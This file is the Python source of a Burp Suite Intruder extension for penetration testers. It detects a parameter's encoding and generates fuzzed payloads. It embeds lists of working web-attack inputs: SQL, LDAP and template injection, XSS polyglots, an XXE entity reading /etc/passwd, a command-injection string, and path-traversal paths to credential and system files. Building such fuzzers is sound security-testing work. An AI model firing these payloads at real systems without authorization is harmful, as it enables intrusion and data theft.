#!/usr/bin/python

#
# BurpSuite's payload-generation extension aiming at applying fuzzed test-cases depending 
# on the type of payload (basic like integer, string, path; json; GWT; binary) and 
# following encoding-scheme applied.
# 
# The main goal of this extension is to detect applied encoding scheme, decode the variable,
# detect type of value within a payload and according to that type select proper mutations,
# then apply some modifications / fuzzes and afterwards encode the generated value according 
# to previously detected encoding scheme. 
#
# Requirements for Jython (to be installed in Jython's environment):
#	- Jython 2.7.1b3+
#	- anytree
#	- jwt
#
# On Windows it may be a bit tricky to resolve Jython's requirements. The steps that worked
# for author of this script are:
#	-----------------------------------------------------------------------------
#	cmd> java -cp jython.jar org.python.util.jython -m ensurepip
#	cmd> java -cp jython.jar org.python.util.jython
#	Jython 2.7.1b3 (default:df42d5d6be04, Feb 3 2016, 03:22:46)
#	[Java HotSpot(TM) 64-Bit Server VM (Oracle Corporation)] on  java1.8.0_144
#	Type "help", "copyright", "credits" or "license" for more information.
#	>>> import pip
#	>>> pip.main(['install', 'anytree'])
#	>>> pip.main(['install', 'pyjwt'])
#	-----------------------------------------------------------------------------
#
# Mariusz B., 2018
#

from burp import IBurpExtender
from burp import IIntruderPayloadGeneratorFactory
from burp import IIntruderPayloadGenerator

from java.util import List, ArrayList

import re
import sys
import jwt
import math
import json
import string
import base64
import urllib
import random
import anytree
import binascii
from collections import Counter

VERSION = '0.1-alpha'

# This pattern will be appended to generated test cases in order to 
# be looked upon when reviewing responses.
UNIQUE_PATTERN_TO_SEARCH_FOR = 'FUZZFUZZ'


# ==========================================================
# SOME PREDEFINED, WISELY CHOSEN FUZZ STRINGS 
# AND OTHER TEST-CASE PATTERNS
#

QUICK_FUZZ_LIST = (
	"'",
	'"',
	"''",
	'""',
	"'\"'",
	"\"''''\"'\"", 
	"\"", 
	"\"\"", 
	"``", 
	"\\'", 
	"\\\"", 
	"&", 
	"|", 
	"}", 
	"\\\\", 
	"\\\\/", 
	"' or ''='", 
	" or 0=0 #\"",
	"' or 0=0 --", 
	"' or 0=0 #", 
	"\" or 0=0 --", 
	"or 0=0 --", 
	"or 0=0 #", 
	"' or 1 --'", 
	"' or 1/*", 
	"; or '1'='1'",
	"' or '1'='1", 
	"' or '1'='1'--", 
	"' or 1=1", 
	"' or 1=1 /*", 
	"' or 1=1--", 
	"'/**/or/**/1/**/=/**/1", 
	"\" or 1=1--",
	"or 1=1", 
	"or 1=1--", 
	" or 1=1 or \"\"=", 
	"' or 1=1 or ''='", 
	"%0D%0A%0D%0A", 
	"*", 
	"*/*", 
	"/", 
	"//", 
	"//*", 
	":", 
	";", 
	"@", 
	"@*", 
	"(", 
	")", 
	"\\", 
	"?*", 
	"%20",
	"%00", 
	' --help',
	' --version',
)

QUICK_FUZZ_INSERT_LIST = (
	"0", 
	"1", 
	"1.0", 
	"2",
	"2147483647", 
	"268435455", 
	"65536", 
	"-1", 
	"-1.0", 
	"-2", 
	"-2147483647", 
	"-268435455", 
	"-65536",

	"*()|%26'", 
	"*()|&'", 
	"*(|(mail=*))", 
	"*(|(objectclass=*))",
	"*)(uid=*))(|(uid=*", 
	"(*)*)", 
	"*)*", 
	"*/*", 
	"*|", 
	"@*", 
	"%70", 
	".%E2%73%70", 
	"%2e0", 
	"%2e", 
	".", 

	"%2f", 
	"%5c", 
	"..",
	'undefined',
	'undef',
	'null',
	'NULL',
	'(null)',
	'nil',
	'NIL',
	'true',
	'false',
	'True',
	'False',
	'TRUE',
	'FALSE',
	'None',
	'hasOwnProperty',
	'\\',

	"count(/child::node())", 
	"false", 
	"null", 
	"true", 
	"{}", 
	'{"1":"0"}',
	'{"1":0}', 
	'{"0":"\\x00"}', 
	'{"0":[]}', 
	'{"0":[1]}', 
	'{"0":[1,2]}', 
	'{"0":["1","2"]}', 
	'{"\\x00":"0"}', 
	'{"\\x00":0}',
	'{"\\x00":""}', 
	'{"\\x00":[]}', 
	'{"\\x00":[1]}', 
	'{"\\x00":[1,2]}', 

	# Server side template injection #1
	"${666666*1}",
	"{{666666*1}}",
	"{{666666*'1'}}",
	"${666666*1}a{{666666}}b",

	# Smarty Template: FUZZFUZZ{*comment*}FUZZFUZZ
	UNIQUE_PATTERN_TO_SEARCH_FOR + "{*comment*}" + UNIQUE_PATTERN_TO_SEARCH_FOR,

	# Mako templates: ${"FUZZFUZZ".join("FUZZFUZZ")}
	'${"' + UNIQUE_PATTERN_TO_SEARCH_FOR + '".join("' + UNIQUE_PATTERN_TO_SEARCH_FOR + '"}}',

	"'\"><img src=x onerror=alert(/666/)>",
	'<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
	"';alert(0)//\\';alert(1)//\";alert(2)//\\\";alert(3)//--></SCRIPT>\">'><SCRIPT>alert(4)</SCRIPT>=&{}\");}alert(6);function xss(){//",
	"jaVasCript:/*-/*`/*\`/*'/*\"/**/(/* */oNcliCk=alert(666666) )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(667667)//>\\x3e",

	"\x0d\x0aCC: example@gmail.com\x0d\x0aLocation: www.google.com",
	"||cmd.exe&&id||",
)

PATH_TRAVERSAL_FILES = {
	'linux': (
		r'.htpasswd',
		r'/etc/passwd',
		r'/proc/self/environ',
		r'/etc/crontab',
		r'/etc/fstab',
		r'/etc/group',
		r'/etc/hostname',
		r'/etc/hosts',
		r'/var/log/dmesg',
		r'/var/log/auth',
		r'/etc/issue',
		r'/etc/resolv.conf',
	),

	'windows' : (
		r'\Windows\win.ini',
		r'\boot.ini',
		r'\winnt\win.ini',
		r'\inetpub\wwwroot\index.asp',
	)
}



# =============================================
# RE-ENCODER'S IMPLEMENTATION
#

class ReEncoder:

    # Switch this to show some verbose informations about decoding process.
    DEBUG = False

    # ============================================================
    # ENCODERS SECTION
    #

    class Encoder:
        def name(self):
            raise NotImplementedError

        def check(self, data):
            raise NotImplementedError
            
        def encode(self, data):
            raise NotImplementedError

        def decode(self, data):
            raise NotImplementedError

    class NoneEncoder(Encoder):
        def name(self):
            return 'None'

        def check(self, data):
            if not data:
                return False
            return True
            
        def encode(self, data):
            return data

        def decode(self, data):
            return data

    class URLEncoder(Encoder):
        def name(self):
            return 'URLEncoder'

        def check(self, data):
            if urllib.quote(urllib.unquote(data)) == data and (urllib.unquote(data) != data):
                return True

            if re.match(r'^(?:%[0-9a-f]{2})+$', data, re.I):
                return True

            return False
            
        def encode(self, data):
            return urllib.quote(data)

        def decode(self, data):
            return urllib.unquote(data)

    class HexEncoder(Encoder):
        def name(self):
            return 'HexEncoded'

        def check(self, data):
            m = re.match(r'^[0-9a-f]+$', data, re.I)
            if m:
                return True
            return False
            
        def encode(self, data):
            return binascii.hexlify(data).strip()

        def decode(self, data):
            return binascii.unhexlify(data).strip()

    class Base64Encoder(Encoder):
        def name(self):
            return 'Base64'

        def check(self, data):
            try:
                if base64.b64encode(base64.b64decode(data)) == data:
                    return True
            except:
                pass
            return False
            
        def encode(self, data):
            return base64.b64encode(data)

        def decode(self, data):
            return base64.b64decode(data)

    class Base64URLSafeEncoder(Encoder):
        def name(self):
            return 'Base64URLSafe'

        def check(self, data):
            try:
                if base64.urlsafe_b64encode(base64.urlsafe_b64decode(data)) == data:
                    return True
            except:
                pass
            return False
            
        def encode(self, data):
            return base64.urlsafe_b64encode(data)

        def decode(self, data):
            return base64.urlsafe_b64decode(data)

    class JWTEncoder(Encoder):
        secret = ''

        def name(self):
            return 'JWT'

        def check(self, data):
            try:
                jwt.decode(data, verify = False)
                return True
            except jwt.exceptions.DecodeError:
                return False
            
        def encode(self, data):
            return jwt.encode(data, JWTEncoder.secret)

        def decode(self, data):
            return jwt.decode(data, verify = False)


    # ============================================================
    # ENCODING DETECTION IMPLEMENTATION
    #

    MaxEncodingDepth = 20

    def __init__(self):
        self.encodings = []
        self.encoders = (
            ReEncoder.URLEncoder(),
            ReEncoder.HexEncoder(),
            ReEncoder.Base64Encoder(),
            ReEncoder.Base64URLSafeEncoder(),
            ReEncoder.JWTEncoder(),

            # None must always be the last detector
            ReEncoder.NoneEncoder(),
        )
        self.encodersMap = {}
        self.data = ''

        for encoder in self.encoders:
            self.encodersMap[encoder.name()] = encoder

    @staticmethod
    def log(text):
        if ReEncoder.DEBUG:
            print(text)

    def verifyEncodings(self, encodings):
        for encoder in encodings:
            if type(encoder) == str:
                if not encoder in self.encodersMap.keys():
                    raise Exception("Passed unknown encoder's name.")
            elif not issubclass(ReEncoder.Encoder, encoder):
                raise Exception("Passed encoder is of unknown type.")

    def generateEncodingTree(self, data):
        step = 0
        maxSteps = len(self.encoders) * ReEncoder.MaxEncodingDepth

        peeledBefore = 0
        peeledOff = 0
        currData = data

        while step < maxSteps:
            peeledBefore = peeledOff
            for encoder in self.encoders:
                step += 1

                ReEncoder.log('[.] Trying: {} (peeled off: {}). Current form: "{}"'.format(encoder.name(), peeledOff, currData))

                if encoder.check(currData):
                    if encoder.name() == 'None':
                        continue

                    if encoder.name().lower().startswith('base64') and (len(currData) % 4 == 0):
                        ReEncoder.log('[.] Unclear situation whether input ({}) is Base64 encoded. Branching.'.format(
                            currData
                        ))

                        yield ('None', currData, True)

                    if encoder.name().lower().startswith('hex') and (len(currData) % 2 == 0):
                        ReEncoder.log('[.] Unclear situation whether input ({}) is Hex encoded. Branching.'.format(
                            currData
                        ))

                        yield ('None', currData, True)

                    ReEncoder.log('[+] Detected encoder: {}'.format(encoder.name()))

                    currData = encoder.decode(currData)
                    yield (encoder.name(), currData, False)

                    peeledOff += 1

                    break

            if (peeledOff - peeledBefore) == 0: 
                break

    def formEncodingCandidates(self, root):
        iters = [[node for node in children] for children in anytree.LevelOrderGroupIter(root)]

        candidates = []

        for node in iters[-1]:
            name = node.name
            decoded = node.decoded

            ReEncoder.log('[.] Candidate for best decode using {}: "{}"...'.format(
                name, decoded[:20]
            ))

            candidates.append([name, decoded, 0.0])

        return candidates

    @staticmethod
    def entropy(data, unit='natural'):
        base = {
            'shannon' : 2.,
            'natural' : math.exp(1),
            'hartley' : 10.
        }

        if len(data) <= 1:
            return 0

        counts = Counter()

        for d in data:
            counts[d] += 1

        probs = [float(c) / len(data) for c in counts.values()]
        probs = [p for p in probs if p > 0.]

        ent = 0

        for p in probs:
            if p > 0.:
                ent -= p * math.log(p, base[unit])

        return ent

    def evaluateEncodingTree(self, root):
        weights = {
            'printableChars' : 10.0,
            'highEntropy' : 4.0,
            'length' : 1.0
        }

        candidates = self.formEncodingCandidates(root)
        maxCandidate = 0

        for i in range(len(candidates)):
            candidate = candidates[i]

            name = candidate[0]
            decoded = candidate[1]
            points = float(candidate[2])

            ReEncoder.log('[=] Evaluating candidate: {} (data: "{}")'.format(
                name, decoded
            ))

            # Step 1: Adding points for printable percentage.
            printables = sum([int(x in string.printable) for x in decoded])
            printablePoints = weights['printableChars'] * (float(printables) / float(len(decoded)))
            ReEncoder.log('\tAdding {} points for printable characters.'.format(printablePoints))
            points += printablePoints

            # Step before-2-and-3: If encoder is Base64 and was previously None
            #    - then length and entropy of previous values should be of slighly lower weights
            if name.lower() == 'none' \
                and len(candidates) > i+1 \
                and candidates[i+1][0].lower().startswith('base64'):
                entropyPoints = ReEncoder.entropy(decoded) * (weights['highEntropy'] * 0.75)
                lengthPoints = float(len(decoded)) * (weights['length'] * 0.75)
            else:
                entropyPoints = ReEncoder.entropy(decoded) * weights['highEntropy']
                lengthPoints = float(len(decoded)) * weights['length']

            # Step 2: Add points for entropy
            ReEncoder.log('\tAdding {} points for high entropy.'.format(entropyPoints))
            points += entropyPoints

            # Step 3: Add points for length
            ReEncoder.log('\tAdding {} points for length.'.format(lengthPoints))
            points += lengthPoints
            
            ReEncoder.log('\tScored in total: {} points.'.format(points))
            candidates[i][2] = points

            if points > candidates[maxCandidate][2]:
                maxCandidate = i

        winningCandidate = candidates[maxCandidate]
        winningPaths = anytree.search.findall_by_attr(
            root, 
            name = 'decoded',
            value = winningCandidate[1]
        )

        ReEncoder.log('[?] Other equally good candidate paths:\n' + str(winningPaths))
        winningPath = winningPaths[0]

        ReEncoder.log('[+] Winning decode path is:\n{}'.format(str(winningPath)))

        encodings = [x.name for x in winningPath.path if x != 'None']

        return encodings

    def process(self, data):
        root = anytree.Node('None', decoded = data)
        prev = root

        for (name, curr, branch) in self.generateEncodingTree(data):
            ReEncoder.log('[*] Generator returned: ("{}", "{}", {})'.format(
                name, curr[:20], str(branch)
            ))

            currNode = anytree.Node(name, parent = prev, decoded = curr)
            if branch:
                pass
            else:
                prev = currNode

        for pre, fill, node in anytree.RenderTree(root):
            ReEncoder.log("%s%s (%s)" % (pre, node.name, node.decoded[:20].decode('ascii', 'ignore')))

        self.encodings = self.evaluateEncodingTree(root)
        ReEncoder.log('[+] Selected encodings: {}'.format(str(self.encodings)))

    def decode(self, data, encodings = []):
        if not encodings:
            self.process(data)
        else:
            self.verifyEncodings(encodings)
            self.encodings = encodings

        for encoderName in self.encodings:
            d = self.encodersMap[encoderName].decode(data)
            data = d

        return data

    def encode(self, data, encodings = []):
        if encodings:
            encodings.reverse()
            self.verifyEncodings(encodings)
            self.encodings = encodings

        for encoderName in self.encodings[::-1]:
            e = self.encodersMap[encoderName].encode(data)
            data = e

        return data


# =============================================
# BURP EXTENDER INTERFACE IMPLEMENTATION
#

class BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory):
	def registerExtenderCallbacks(self, callbacks):
		self._callbacks = callbacks
		self._helpers = callbacks.getHelpers()

		print('''
	Context-Aware Payload Fuzzer
	Mariusz B. / mgeeky, v{}.

[+] For more informations about this extension - please visit:
	https://github.com/mgeeky/burpContextAwareFuzzer

[+] Unique pattern applied to input-values, to look for in responses:
	"{}"
'''.format(
		VERSION, UNIQUE_PATTERN_TO_SEARCH_FOR
	))

		callbacks.registerIntruderPayloadGeneratorFactory(self)

	def getGeneratorName(self):
		return 'Context-Aware Payload Fuzzer'

	def createNewInstance(self, attack):
		return ContextAwareFuzzer(self, attack)


# =============================================
# TYPE DETECTORS AND FUZZERS
#

class BaseFuzzer:
	def name(self):
		raise NotImplementedError

	def check(self, data):
		raise NotImplementedError

	def getMutations(self, data):
		raise NotImplementedError

	def reset(self):
		raise NotImplementedError

class BasicTypeFuzzer(BaseFuzzer):
	def __init__(self):
		self.mutations = []

	def reset(self):
		self.mutations = []

	def name(self):
		return 'BasicType'

	def findType(self, data):
		try:
			val = int(data)
			return 'integer'
		except ValueError:
			pass

		try:
			val = float(data)
			return 'float'
		except ValueError:
			pass

		printable = sum([int(x in string.printable) for x in data]) == len(data)
		if printable:
			if '/' in data or '\\' in data:
				return 'path'
			return 'string'
		else:
			return ''

	def check(self, data):
		return self.findType(data) != ''

	def stringMutator(self, payload):
		offset = random.randint(0, len(payload) - 1)
		mutated0 = payload[:offset]
		mutated1 = payload[offset:]

		# Mutations #4: Add some repeated values
		for i in range(3):
			try:
				chunkLen = random.randint(len(payload[offset:]), len(payload) - 1)
			except ValueError:
				chunkLen = len(payload) - offset
			repeater = random.randint(1, 10)

			repeated = mutated0
			for i in range(repeater):
				repeated += payload[offset : offset + chunkLen]

			self.mutations.append(repeated + mutated1)

		# Mutations #5: Some random bit flips
		for i in range(10):
			byte = random.randint(0, len(payload) - 1)
			bit = random.randint(0, 7)

			mutatedByte = '%{:02x}'.format( (ord(payload[byte]) ^ (1 << bit)) % 255 )
			mutated = payload[:byte - 1] + mutatedByte + payload[byte + 1:]
			self.mutations.append(mutated)

		# Mutations #6: Add those cut in half pieces
		self.mutations.append(mutated0)
		self.mutations.append(mutated1)

		return list(set(self.mutations))

	def genericMutations(self, payload):
		offset = random.randint(0, len(payload) - 1)
		mutated0 = payload[:offset]
		mutated1 = payload[offset:]

		mutations = []

		# Mutation #1: Empty string
		mutations.append('')

		# Mutations #2: Some predefined entries in place of previous value
		for i in QUICK_FUZZ_LIST:
			mutations.append(
				payload + i + UNIQUE_PATTERN_TO_SEARCH_FOR
			)

		for i in QUICK_FUZZ_INSERT_LIST:
			mutations.append(i)

		# Mutations #3: Some predefined entries inside of a payload
		for i in QUICK_FUZZ_LIST:
			mutations.append(
				mutated0 + i + mutated1 + UNIQUE_PATTERN_TO_SEARCH_FOR
			)

		self.mutations = mutations
		return mutations

	def integerMutator(self, data):
		values = [
			2 ** 0, 2 ** 1, 2 ** 8 - 1, 2 ** 8, 1000, 2 ** 16 - 1, 2 ** 16, 2 ** 32 - 1, 2 ** 32
		]

		edgeCases = values + [-x for x in values]

		return [str(x) for x in edgeCases]

	def floatMutator(self, data):
		values = [
			2 ** 0, 2 ** 1, 2 ** 8 - 1, 2 ** 8, 1000, 2 ** 16 - 1, 2 ** 16, 2 ** 32 - 1, 2 ** 32
		]

		# normalized, denormalized, edge, and other values
		ieee754trickery = [
			0.0000000000000000000000000000000000000000000014013,
			100000017085266530000000000000000000000.0,
			1.99999988079071044921875,
			170141183460469231731687303715884105728,
			5.878951525289764546670578144551182540527959740471059208198733995499873916656952133052982389926910400390625E-39,
			1.175494210692441075487029444849287348827052428745893333857174530571588870475618904265502351336181163787841796875E-38,
			2.2250738585072011e-308
		]

		edgeCases = []

		for vals in [values, ieee754trickery]:
			edgeCases.extend([float(x) for x in vals] + [float(-x) for x in vals])

		out = [str(x) for x in edgeCases]
		out.extend([
			'Inf', 
			'Infinity', 
			'NaN', 
			'0..0',
			'.',
			'0.0.0',
			'0,00',
			'0,,0',
			'1#INF',
			'1#IND',

		])

		return out

	def pathMutator(self, data):
		# Number of mutations to generate:
		# 	num = 2 * len(files) * len(dotTemplates) * depth
		depth = 8
		dotTemplates = {
			'linux': (
				'../', '..%2f', '%2e%2e%2f', '..%252f', '..%c0%af../'
			), 
			'windows': (
				'..\\', '..%5c', '%2e%2e%5c', '..%255c', '..%c0%af..\\'
			)
		}

		slashes = {
			'linux' : '/',
			'windows' : '\\',
		}

		for os in ['linux', 'windows']:
			slash = slashes[os]
			dots = dotTemplates[os]
			files = PATH_TRAVERSAL_FILES[os]

			for file in files:
				for i in range(depth):
					path = dots * i + slash + file
					self.mutations.append(path)
					self.mutations.append(slash + path)


	def getMutations(self, data):
		self.genericMutations(data)

		varType = self.findType(data)

		if varType == 'string':
			self.stringMutator(data)

		elif varType == 'integer':
			self.integerMutator(data)

		elif varType == 'path':
			self.pathMutator(data)

		return self.mutations

class JSONTypeFuzzer(BaseFuzzer):
	def name(self):
		return 'JSON'

	def reset(self):
		pass

	def check(self, data):
		try:
			json.loads(data)
			return True
		except ValueError:
			return False

	def getMutations(self, data):
		print('[!] JSONTypeFuzzer.getMutations not implemented yet. Returning BasciTypeFuzzer mutations.')

		validJson = json.loads(data)
		mutations = []
		fuzzer = BasicTypeFuzzer()

		return fuzzer.getMutations(data)


# =============================================
# MAIN EXTENSION INTERFACE IMPLEMENTATION
#

class ContextAwareFuzzer(IIntruderPayloadGenerator):
	def __init__(self, extender, attack):
		self._extender = extender
		self._attack = attack
		self._helpers = extender._helpers

		self.mutations = []
		self.payloadsToGenerate = 10
		self.payloadsGenerated = 0

		self.typeHandlers = (
			JSONTypeFuzzer(),

			# The most generic type fuzzer must be last one
			BasicTypeFuzzer(),
		)

	def hasMorePayloads(self):
		return (self.payloadsGenerated < self.payloadsToGenerate)

	def getNextPayload(self, currentPayload):
		payload = self._helpers.bytesToString(currentPayload)

		reencode = ReEncoder()
		payload = reencode.decode(payload)

		payload = self.mutatePayload(payload)
		self.payloadsGenerated += 1

		return reencode.encode(payload)

	def reset(self):
		self.payloadsGenerated = 0
		self.mutations = []

		for typeHandler in self.typeHandlers:
			typeHandler.reset()

		print('[.] Reset.')

	def prepareMutations(self, payload):
		for typeHandler in self.typeHandlers:
			if typeHandler.check(payload):
				return typeHandler.getMutations(payload)

		return []

	def mutatePayload(self, payload):
		if len(self.mutations) == 0:
			print('[.] Generating mutations for: "{}"'.format(payload))
			
			self.mutations = self.prepareMutations(payload)
			self.payloadsToGenerate = len(self.mutations)
			
			print('[.] Generated {} mutations'.format(len(self.mutations)))

		#print('[>] Returning mutation {}: "{}"'.format(
		#	self.payloadsGenerated, self.mutations[self.payloadsGenerated]
		#))

		return self.mutations[self.payloadsGenerated]